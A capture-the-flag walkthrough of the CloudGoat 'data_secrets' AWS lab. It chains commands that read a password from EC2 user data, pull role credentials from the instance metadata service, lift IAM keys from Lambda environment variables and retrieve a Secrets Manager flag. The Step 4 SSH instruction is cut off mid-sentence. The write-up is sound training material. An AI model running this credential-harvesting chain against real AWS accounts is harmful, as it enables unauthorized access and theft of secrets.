---
title: "CloudGoat Vulnerable Lambda Walkthrough"
categories: ["Cloud Security", "AWS"]
tags: ["cloudgoat", "aws", "labs", "ctf", "cloudsecurity"]
---

## Description
In this scenario, you start with an IAM user with limited permissions. Your task is to identify a misconfigured EC2 instance leaking credentials in its User Data, allowing you to gain SSH access. From there, you must pivot by exploiting the Instance Metadata Service (IMDS) to steal a role, enumerate Lambda functions to find hidden environment variables, and finally compromise a user with access to the scenario's objective: a secret stored in AWS Secrets Manager.

---
## Scenario: `data_secrets`

**Size:** Small  
**Difficulty:** Easy  

**Launch Command:**  
```
bash
cloudgoat create data_secrets
```
## Scenario Resources
- 1 IAM User

- 1 EC2 Instance

- 1 IAM Role

- 1 Lambda Function

- 1 Secrets Manager Secret

## Scenario Goal
`Retrieve the final flag stored in the AWS Secrets Manager.`

## Exploitation Walkthrough
### Step 1:Use the access key and secret key provided when you launched the scenario and configure cloudgoat with your aws credentials by running

```
amir@amir:~/cloudgoat$ cloudgoat config aws
# Enter Access Key ID
# Enter Secret Access Key
# Default region: us-east-1
# Default output format: json
```
### Step 2:Enumerate Permissions & EC2 Resources for the User that was configured

Check who you are and what permissions you might have. While `get-caller-identity` confirms your identity, often in these scenarios, you want to see what resources are visible.

```
aws sts get-caller-identity --profile start_user
{
    "UserId": "XXXXXXXXXXXXXXX",
    "Account": "2599XXXXXXX",
    "Arn": "arn:aws:iam::<account-id>:user/<example-user>"
}
```
Attempt to list EC2 instances to see if any are running in the account.

```
aws ec2 describe-instances --region us-east-1 --profile start_user
```
### Step 3:Inspect EC2 User Data
A frequent AWS security mistake is storing sensitive information (such as scripts, credentials, or API keys) inside EC2 User Data. Anyone with the permission `ec2:DescribeInstanceAttribute` can often retrieve this data.

Use the following command to obtain the User Data of the instance you identified earlier:

```
aws ec2 describe-instance-attribute --instance-id <INSTANCE_ID> --attribute userData --region us-east-1 --profile start_user
```
The command output will contain a UserData field with a Base64-encoded value. Decode it to view the script:
```
echo "<BASE64_VALUE>" | base64 --decode
```
- The decoded script should reveal configuration commands used during instance initialization. In this scenario, the script sets a password for the `ec2-user` account (for example: `ec2-user:CloudGoatInstancePassword!)` and enables password-based SSH authentication.

### Step 4: Connect to the EC2 Instance
Using the public IP address discovered earlier and the password retrieved from the User Data script, connect to the ins>When prompted, enter the password found in the decoded User Data.

### Step 5: Access the Instance Metadata Service (IMDS)
After logging into the instance, you may be able to access the IAM role credentials assigned to the EC2 instance through the Instance Metadata Service.

The metadata service is available at the link-local address:
```
169.254.169.254
```

First, determine the name of the IAM role attached to the instance:
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

This should return the role name, for example:
```
cg-ec2-instance-profile-<CGID>
```

Next, retrieve the temporary credentials associated with that role:
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```
Copy the following values from the response:
- AccessKeyId
- SecretAccessKey
- Token

### Step 6: Configure a New AWS Profile
Exit the SSH session and return to your local machine. Use the credentials obtained from the metadata service to create a new AWS CLI profile.
```
aws configure --profile ec2_role
```
Enter the following values when prompted:

- Access Key ID
- Secret Access Key
- Default region: us-east-1

### Step 7: Enumerate Lambda Functions
Using the newly created profile, explore other AWS services for potential privilege escalation opportunities. AWS Lambda functions are a common place where developers accidentally expose secrets.
List the Lambda functions in the region:
```
aws lambda list-functions --region us-east-1 --profile ec2_role
```

You should see a function similar to:
```
cg-lambda-function-<CGID>
```

### Step 8: Inspect Lambda Environment Variables
Developers sometimes store credentials directly in Lambda environment variables, which can lead to unintended exposure.

Retrieve the function configuration:
```
aws lambda get-function --function-name <FUNCTION_NAME> --region us-east-1 --profile ec2_role
```
Within the JSON output, navigate to:
```
- Configuration → Environment → Variables
```

You should find two values:
- `DB_USER_ACCESS_KEY`
- `DB_USER_SECRET_KEY`

These appear to belong to another IAM user.

### Step 9: Create a Profile for the New Credentials
Configure another AWS CLI profile using the credentials discovered in the Lambda environment variables.

```
aws configure --profile lambda_user
```
Enter the Access Key and Secret Key obtained from the Lambda configuration.

### Step 10: Retrieve the Final Secret
With the `lambda_user` profile configured, check if the account has access to AWS Secrets Manager, which is commonly used to store sensitive information.

First, list the available secrets:
```
aws secretsmanager list-secrets --region us-east-1 --profile lambda_user
```

You should find a secret similar to:
`cg-final-flag-<CGID>`

Retrieve the value of the secret:
```
aws secretsmanager get-secret-value --secret-id <SECRET_ARN> --region us-east-1 --profile lambda_user
```

The response will contain a 'SecretString' field. Extract the value to reveal the final flag.
```
"SecretString": "{\"flag\":\"d4t4_s3cr3ts_4r3_fun\"}"
```

Congratulations! You have successfully completed the scenario.
